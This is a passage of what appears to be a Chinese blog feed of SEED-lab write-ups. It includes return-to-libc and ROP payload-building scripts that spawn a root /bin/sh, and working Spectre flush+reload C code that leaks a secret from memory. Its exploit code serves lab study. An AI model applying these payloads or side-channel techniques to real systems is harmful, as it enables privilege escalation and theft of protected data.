argv[]);</code></p><ul><li>pathname就是<code>/bin/sh</code></li><li>argv[0]是<code>/bin/sh</code>，argv[1]是<code>-p</code>，argv[2]是0</li></ul><p>为了编写exploit.py，我们需要做如下工作：</p><ul><li>export环境变量，并打印出字符串的地址</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-keyword">char</span> *shell=getenv(<span class="hljs-string">&quot;MYSHELL&quot;</span>);<br>        <span class="hljs-keyword">char</span> *p=getenv(<span class="hljs-string">&quot;P&quot;</span>);<br>        <span class="hljs-keyword">if</span>(shell)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>,(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)shell);<br>        <span class="hljs-keyword">if</span>(p)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>,(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)p);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>使用gdb找到execv函数与exit函数的地址，使用gdb的find命令可以查找字符串的地址</li><li>组织payload字符串</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Fill content with non-zero values</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0xaa</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>))<br><br>Z = <span class="hljs-number">0x120</span>+<span class="hljs-number">8</span><br>zero_addr = <span class="hljs-number">0</span><span class="hljs-comment"># The address of &quot;NULL&quot;</span><br>content[Z:Z+<span class="hljs-number">4</span>] = (zero_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><br>X = <span class="hljs-number">0x120</span>+<span class="hljs-number">4</span><br>p_addr =    <span class="hljs-number">0xffffd6d7</span>        <span class="hljs-comment"># The address of &quot;-p&quot;</span><br>content[X:X+<span class="hljs-number">4</span>] = (p_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>Y = <span class="hljs-number">0x120</span><br>sh_addr1 = <span class="hljs-number">0xffffd461</span>         <span class="hljs-comment"># The address of &quot;/bin/bash&quot; argv[0]</span><br>content[Y:Y+<span class="hljs-number">4</span>] = (sh_addr1).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>A = <span class="hljs-number">40</span><br>addr = <span class="hljs-number">0xffffce00</span>+<span class="hljs-number">0x120</span>         <span class="hljs-comment"># point to pointer </span><br>content[A:A+<span class="hljs-number">4</span>] = (addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># above : start of argv[]</span><br><br>B = <span class="hljs-number">36</span><br>sh_addr = <span class="hljs-number">0xffffd461</span>       <span class="hljs-comment"># The address of &quot;/bin/bash&quot;</span><br>content[B:B+<span class="hljs-number">4</span>] = (sh_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>C = <span class="hljs-number">32</span><br>exit_addr = <span class="hljs-number">0xf7e03f80</span>  <span class="hljs-comment"># The address of exit()</span><br>content[C:C+<span class="hljs-number">4</span>] = (exit_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>D = <span class="hljs-number">28</span><br>execv_addr = <span class="hljs-number">0xf7e984b0</span>  <span class="hljs-comment"># The address of execv()</span><br>content[D:D+<span class="hljs-number">4</span>] = (execv_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Save content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure><p>这里卡了很久，因为我在构建argv[]的时候，一直选择紧邻exit函数的地方，这样input的缓冲区可能会被buffer覆盖，感谢<a href="https://munian.life/2022/04/07/SeedLab2.0-Buffer-Overflow/%E8%BF%99%E7%AF%87%E5%8D%9A%E5%AE%A2%EF%BC%8C%E6%8F%90%E9%86%92%E4%BA%86%E6%88%91%E8%A6%81%E5%9C%A8%E8%BE%83%E8%BF%9C%E5%9C%B0%E5%9D%80%E5%A4%84%E6%9E%84%E5%BB%BA%E7%BC%93%E5%86%B2%E5%8C%BA%E5%86%85%E5%AE%B9">https://munian.life/2022/04/07/SeedLab2.0-Buffer-Overflow/这篇博客，提醒了我要在较远地址处构建缓冲区内容</a></p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image_2.png"></p><h1 id="Task-5-Optional-Return-Oriented-Programming"><a href="#Task-5-Optional-Return-Oriented-Programming" class="headerlink" title="Task 5 (Optional): Return-Oriented Programming"></a>Task 5 (Optional): Return-Oriented Programming</h1><p>这个要比task4简单多了，先for循环填充10个foo函数的地址，然后按照类似task3的步骤填充system、exit、/bin/sh即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Fill content with non-zero values</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0xaa</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>))<br><br>D = <span class="hljs-number">28</span><br>foo_addr = <span class="hljs-number">0x565562b0</span><br><span class="hljs-keyword">for</span>(i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))<br>content[D:D+<span class="hljs-number">4</span>] = (foo_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>D=D+<span class="hljs-number">4</span><br><br>Y = D<br>system_addr = <span class="hljs-number">0xf7e11420</span>        <span class="hljs-comment"># The address of system()</span><br>content[Y:Y+<span class="hljs-number">4</span>] = (system_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>Z = Y+<span class="hljs-number">4</span><br>exit_addr = <span class="hljs-number">0xf7e03f80</span>           <span class="hljs-comment"># The address of exit()</span><br>content[Z:Z+<span class="hljs-number">4</span>] = (exit_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>X = Z+<span class="hljs-number">4</span><br>sh_addr = <span class="hljs-number">0xffffd461</span>            <span class="hljs-comment"># The address of &quot;/bin/sh&quot;</span><br>content[X:X+<span class="hljs-number">4</span>] = (sh_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Save content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/QQ%E5%9B%BE%E7%89%8720230123154648.png"></p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Spectre Attack Lab</title>
    <link href="/p/2724e696/"/>
    <url>/p/2724e696/</url>
    
    <content type="html"><![CDATA[<h1 id="Out-of-Order-Execution-and-Branch-Prediction"><a href="#Out-of-Order-Execution-and-Branch-Prediction" class="headerlink" title="Out-of-Order Execution and Branch Prediction"></a>Out-of-Order Execution and Branch Prediction</h1><p>为了提高运行效率，CPU具有两个重要特性：</p><ul><li>乱序执行</li><li>分支预测</li></ul><blockquote><p>现代高性能 CPU 不再严格按照指令的原始顺序执行指令，而是允许乱序执行耗尽所有的执行单元。以提高效率</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">size=<span class="hljs-number">10</span>;<br>data = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (x &lt; size) &#123;<br>data = data + <span class="hljs-number">5</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据我们之前的印象，如果x的值小于size，那么才会执行第五行代码，但是实际上，即是x的值大于等于size，第四行也会去执行</p><p>乱序执行是一种优化技术，允许 CPU 最大限度地利用其所有执行单元。CPU 没有严格按顺序处理指令，而是在所有所需资源都可用时立即并行执行指令。当当前操作的执行单元被占用时，其他执行单元可以提前运行</p><p>第2行涉及两个操作:</p><ul><li>内存中加载 size 的值</li><li>将size值与 x 进行比较 </li></ul><p>如果 size 不在 CPU 缓存中，那么读取该值之前可能需要数百个 CPU 时钟周期。现代 CPU 不会闲置，而是尝试预测if语句中的比较的结果，并根据估计执行分支。这种执行在比较结束之前就开始了，也即是乱序执行</p><p>在执行乱序执行之前，CPU 会存储寄存器的当前状态和值。当 size 的值最终到达时，CPU 将检查实际结果</p><ul><li>如果预测正确，则提交预测执行，这个情况会获得显著的性能提高</li><li>如果预测错误，CPU 将恢复到保存状态，也即是乱序执行产生的所有结果将被丢弃，就像从未发生过一样。这就是为什么我们从外面看到3号线从未被执行</li></ul><p>幽灵漏洞在于，处理器厂商忽略了分支预测对 CPU 缓存的影响。在乱序执行过程中，被引用的内存被提取到一个寄存器中，并存储在缓存中。厂商只是丢弃了乱序执行的结果，但是却没有丢弃对CPU缓存的影响</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230225223421.png"></p><p>SpectreExperiment.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CACHE_HIT_THRESHOLD (80)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-keyword">int</span> size = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><span class="hljs-keyword">uint8_t</span> temp = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">flushSideChannel</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i;<br><br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> +DELTA]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">reloadSideChannel</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-keyword">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">uint8_t</span> *addr;<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The Secret = %d.\n&quot;</span>, i);<br>    &#125;<br>  &#125; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">victim</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt; size) &#123;  <br>      temp = <span class="hljs-built_in">array</span>[x * <span class="hljs-number">4096</span> + DELTA];  <br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> i;<br><br>  <span class="hljs-comment">// FLUSH the probing array</span><br>  flushSideChannel();<br><br>  <span class="hljs-comment">// Train the CPU to take the true branch inside victim()</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;   <br>      victim(i);<br>  &#125;<br><br>  <span class="hljs-comment">// Exploit the out-of-order execution</span><br>  _mm_clflush(&amp;size);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)<br>      _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); <br>  victim(<span class="hljs-number">97</span>);  <br><br>  <span class="hljs-comment">// RELOAD the probing array</span><br>  reloadSideChannel();<br><br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>); <br>&#125;<br><br></code></pre></td></tr></table></figure><p>CPU会记录过去采用的分支，然后利用这些过去的结果来预测 if 语句Speculative_execution中应该采用哪个分支。为了触发攻击，我们需要诱导CPU执行我们想要的分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">// Train the CPU to take the true branch inside victim()</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;   <br>      victim(i);<br>  &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">victim</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt; size) &#123;  <span class="hljs-comment">// size值为10，因此下面语句每一次都会被执行</span><br>      temp = <span class="hljs-built_in">array</span>[x * <span class="hljs-number">4096</span> + DELTA];  <br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在训练完之后，我们刷新size的缓存，从而使得后续的<code>victim(97)</code>调用中读取size值需要上百个时钟周期</p><p>之后刷新<code>0~256</code>的缓存，这会导致包括97在内所有数字不在缓存内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">_mm_clflush(&amp;size);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)<br>    _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); <br></code></pre></td></tr></table></figure><p>之后执行victim(97)，按常理考虑<code>temp = array[97 * 4096 + DELTA];</code>语句不会被执行，因此97也不会在CPU cache中，但是我们实验结果表明97在cache中，因此该语句被执行了</p><blockquote><p>关于为什么需要写成array[x * 4096 + DELTA]; 可以见我meltdown的一篇文章</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230225224827.png"></p><p>quiz1：</p><blockquote><p>Comment out the line marked with P and execute again. Explain your observation. After you are<br>done with this experiment, uncomment it, so the subsequent tasks are not affected</p></blockquote><p>给_mm_clflush(&amp;size);这一行代码加注释之后运行：</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230225224958.png"></p><p>我们可以看到，如果size仍然在CPU cache中，那么可以快速获得size的值，就不会导致乱序执行，无法获得结果</p><p>quiz2:</p><blockquote><p>Replace Line √ with victim(i + 20); run the code again and explain your observation.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230225224958.png"></p><p>同样无法获得结果，说明CPU的分支预测训练是必要的</p><h1 id="The-Spectre-Attack"><a href="#The-Spectre-Attack" class="headerlink" title="The Spectre Attack"></a>The Spectre Attack</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bound_lower = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bound_upper = <span class="hljs-number">9</span>;<br><span class="hljs-keyword">uint8_t</span> buffer[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;; <br><span class="hljs-keyword">char</span>    *secret    = <span class="hljs-string">&quot;Some Secret Value&quot;</span>;   <span class="hljs-comment">// define secret messege</span><br><span class="hljs-keyword">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CACHE_HIT_THRESHOLD (80)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-comment">// Sandbox Function</span><br><span class="hljs-function"><span class="hljs-keyword">uint8_t</span> <span class="hljs-title">restrictedAccess</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;<br>     <span class="hljs-keyword">return</span> buffer[x];<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">flushSideChannel</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> +DELTA]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">reloadSideChannel</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-keyword">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">uint8_t</span> *addr;<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The Secret = %d(%c).\n&quot;</span>,i, i);<br>    &#125;<br>  &#125; <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spectreAttack</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> index_beyond)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">uint8_t</span> s;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> z;<br>  <span class="hljs-comment">// Train the CPU to take the true branch inside restrictedAccess().</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123; <br>      restrictedAccess(i); <br>  &#125;<br>  <span class="hljs-comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span><br>  _mm_clflush(&amp;bound_upper);<br>  _mm_clflush(&amp;bound_lower);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br>  <span class="hljs-keyword">for</span> (z = <span class="hljs-number">0</span>; z &lt; <span class="hljs-number">100</span>; z++)  &#123;   &#125;<br>  <span class="hljs-comment">// Ask restrictedAccess() to return the secret in out-of-order execution. </span><br>  s = restrictedAccess(index_beyond);  <br>  <span class="hljs-built_in">array</span>[s*<span class="hljs-number">4096</span> + DELTA] += <span class="hljs-number">88</span>;  <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  flushSideChannel();<br>  <span class="hljs-keyword">size_t</span> index_beyond = (<span class="hljs-keyword">size_t</span>)(secret - (<span class="hljs-keyword">char</span>*)buffer);  <br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;secret: %p \n&quot;</span>, secret);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buffer: %p \n&quot;</span>, buffer);\<span class="hljs-function">x0A  <span 